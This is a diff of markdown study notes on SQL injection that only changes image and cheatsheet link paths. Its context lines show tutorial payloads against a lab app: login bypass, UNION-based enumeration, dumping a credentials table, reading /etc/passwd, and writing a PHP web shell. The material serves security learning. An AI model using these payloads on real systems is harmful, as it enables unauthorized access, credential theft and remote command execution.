@@ -97,8 +97,8 @@
 
 ---
 
-[Cheatsheet SQLi](../../../cheatsheets/Sql_Injection_Fundamentals_Module_Cheat_Sheet.pdf)<br>
-[Cheatsheet SQLMap](../../../cheatsheets/Sqlmap_Essentials_Module_Cheat_Sheet.pdf)
+[Cheatsheet SQLi](../../../../cheatsheets/Sql_Injection_Fundamentals_Module_Cheat_Sheet.pdf)<br>
+[Cheatsheet SQLMap](../../../../cheatsheets/Sqlmap_Essentials_Module_Cheat_Sheet.pdf)
 
 # SQL Injection (SQLi)
 
@@ -197,11 +197,11 @@ C --> H
 
 ### Authentication Bypass
 
-![Admin Panel](../../../images/sqli1.png)
+![Admin Panel](../../../../images/sqli1.png)
 
 You can log in with the admin creds ```admin:p@ssw0rd```.
 
-![Login successful](../../../images/sqli2.png)
+![Login successful](../../../../images/sqli2.png)
 
 The current SQL query being executed:
 
@@ -213,7 +213,7 @@ The page takes in the credentials, then uses the AND operator to select records 
 
 Example with wrong creds:
 
-![Login failed](../../../images/sqli3.png)
+![Login failed](../../../../images/sqli3.png)
 
 ### SQLi Discovery
 
@@ -229,7 +229,7 @@ Before you start subverting the web app's logic and attempting to bypass the aut
 
 Example for ```'```:
 
-![Syntax Error](../../../images/sqli4.png)
+![Syntax Error](../../../../images/sqli4.png)
 
 The quote you entered resulted in an odd number of quotes, causing a syntax error. One option would be to comment out the rest of the query and write the remainder of the query as part of your injection to form a workin query. Another option is to use an even number of quotes within your injected query, such that the final query would still work.
 
@@ -253,13 +253,13 @@ The AND operator will be evaluated first, and it will return false. Then, the OR
 
 ### Auth Bypass with OR Operator
 
-![Login as admin](../../../images/sqli5.png)
+![Login as admin](../../../../images/sqli5.png)
 
 You were able to log in successfully as admin. However, the login fails when using 'notAdmin' as a user, since that user does not exist in the table and therefore resulted in a fals query overall.
 
 To successfully login once again, you will need an overall true query. This can be achieved by injecting an OR condition into the password field, so it will always return true.
 
-![Login as notAdmin](../../../images/sqli6.png)
+![Login as notAdmin](../../../../images/sqli6.png)
 
 The additional OR condition resulted in a true query overall, as the WHERE clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return true, you do not have to provide a test username and password and can directly start with ```'``` injection and log in with just ```' or '1'='1```.
 
@@ -306,17 +306,17 @@ SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
 
 You can see from the syntax highlighting, the username is now admin, and the remainder of the query is now ignored as a comment.
 
-![Login with comment 1](../../../images/sqli7.png)
+![Login with comment 1](../../../../images/sqli7.png)
 
 #### Paranthesis
 
 SQL supports the usage of pranthesis if the application needs to check for particular conditions before others. Expressions within the paranthesis take precedence over other operators and evaluated first.
 
-![Paranthesis 1](../../../images/sqli8.png)
+![Paranthesis 1](../../../../images/sqli8.png)
 
 The login failed due to a syntax error, as a closed one did not balance the open paranthesis. To execute the query successfully, you will have to add a closing paranthesis.
 
-![Paranthesis 2](../../../images/sqli9.png)
+![Paranthesis 2](../../../../images/sqli9.png)
 
 The query was successful, and you logged in as admin. The final query as a result of the input is:
 
@@ -431,7 +431,7 @@ This is the benefit of using numbers as your junk data, as it makes it easy to t
 cn' UNION select 1,@@version,3,4-- 
 ```
 
-![@@version](../../../images/sqli10.png)
+![@@version](../../../../images/sqli10.png)
 
 ### Database Enumeration
 
@@ -496,7 +496,7 @@ cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA--
 
 And you get a result like this:
 
-![SCHEMATA](../../../images/sqli11.png)
+![SCHEMATA](../../../../images/sqli11.png)
 
 You can see two databases ```ilfreight``` and ```dev```. To find out which database the web app is running to retrieve ports data from, you can use ```SELECT database()```.
 
@@ -514,7 +514,7 @@ The TABLES table contains information about all tables throughout the database. 
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
 ```
 
-![TABLE_NAME](../../../images/sqli12.png)
+![TABLE_NAME](../../../../images/sqli12.png)
 
 > [!NOTE]
 > Added a (_where table_schema='dev'_) condition to only return tables from the 'dev' database, otherwise you would get all tables in all databases, which can be many
@@ -527,7 +527,7 @@ To dump the data of the ```credentials``` table, you first need to find the colu
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
 ```
 
-![two columns](../../../images/sqli13.png)
+![two columns](../../../../images/sqli13.png)
 
 The table has two columns named ```username``` and ```password```.
 
@@ -539,7 +539,7 @@ Now that you have all the information, you can form your UNION query to dump dat
 cn' UNION select 1, username, password, 4 from dev.credentials-- 
 ```
 
-![Creds](../../../images/sqli14.png)
+![Creds](../../../../images/sqli14.png)
 
 ### Reading & Writing Files
 
@@ -564,7 +564,7 @@ So the payload will be:
 cn' UNION SELECT 1, user(), 3, 4-- 
 ```
 
-![User](../../../images/sqli15.png)
+![User](../../../../images/sqli15.png)
 
 #### User Privileges
 
@@ -585,7 +585,7 @@ cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user--
 
 A possible result can look like this:
 
-![YES](../../../images/sqli16.png)
+![YES](../../../../images/sqli16.png)
 
 The query returned ```Y```, which means YES, indicating superuser privileges. You can also dump other privileges you have from the schema:
 
@@ -599,7 +599,7 @@ Again, being more precise:
 cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
 ```
 
-![privilege_type](../../../images/sqli17.png)
+![privilege_type](../../../../images/sqli17.png)
 
 You can see that the ```FILE``` privilegeis listed for your user, enabling you to read files and potentially even write files.
 
@@ -611,7 +611,7 @@ The ```LOAD_FILE()``` function can be used in MariaDB / MySQL to read data from 
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
 ```
 
-![/etc/passwd](../../../images/sqli18.png)
+![/etc/passwd](../../../../images/sqli18.png)
 
 #### Write File Privileges
 
@@ -643,7 +643,7 @@ So the payload will be:
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
 ```
 
-![SECURE_FILE_PRIV](../../../images/sqli19.png)
+![SECURE_FILE_PRIV](../../../../images/sqli19.png)
 
 ```secure_file_priv``` is empty, meaning you can read/write files to any location.
 
@@ -679,7 +679,7 @@ cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/
 
 If there are no errors, that indicates that the query was succeeded. But can check too:
 
-![success](../../../images/sqli20.png)
+![success](../../../../images/sqli20.png)
 
 #### Writing a Web Shell
 
@@ -691,7 +691,7 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 
 If there are no errors, you can now browse to ```/shell.php``` and execute commands via the parameter ```0```, with ```?0=id``` in your URL.
 
-![web shell](../../../images/sqli21.png)
+![web shell](../../../../images/sqli21.png)
 
 ## SQLi Mitigation
 
@@ -933,7 +933,7 @@ if (!$result)
 
 As error reporting is enabled for the vulnerbale SQL query, there will be a database error returned as part of the web server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tampering, as the resulting errors are easily recognized.
 
-![sqlmap1](../../../images/sqlmap1.png)
+![sqlmap1](../../../../images/sqlmap1.png)
 
 To run SQLMap against this example, located at the example URL ```http://www.example.com/vuln.php?id=1```, would look like the following:
 
